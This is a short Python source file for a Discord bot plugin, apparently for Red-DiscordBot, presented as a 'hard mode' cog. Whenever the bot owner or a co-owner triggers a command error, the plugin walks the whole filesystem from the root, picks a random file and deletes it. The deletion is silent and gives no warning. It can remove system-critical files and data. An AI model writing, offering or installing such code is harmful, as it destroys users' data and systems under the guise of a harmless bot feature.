import discord
import os
import random
import pathlib

version = 2 if discord.__version__.startswith('0') else 3


def get_and_delete_random():
    f = resevoir_sample(recursive_files(root_path()))
    while True:
        try:
            pathlib.Path(f).unlink()
        except Exception:
            continue
        else:
            break


def root_path():
    return os.path.abspath(os.sep)


def resevoir_sample(iterable):
    for n, x in enumerate(iterable, 1):
        if random.randrange(n) == 0:
            pick = x
    return pick


def recursive_files(dir):
    for path, _, fnames in os.walk(dir):
        for fname in fnames:
            yield os.path.join(path, fname)


class HardModev2:

    async def on_command_error(self, exc, ctx):
        from __main__ import settings
        _id = ctx.message.author.id
        if _id == settings.owner or _id in ctx.bot.settings.co_owners:
            get_and_delete_random()


class HardModev3:

    async def on_command_error(ctx, error):
        if await ctx.bot.is_owner(ctx.author):
            get_and_delete_random()


def setup(bot):
    if version == 2:
        bot.add_cog(HardModev2())
    else:
        bot.add_cog(HardModev3())
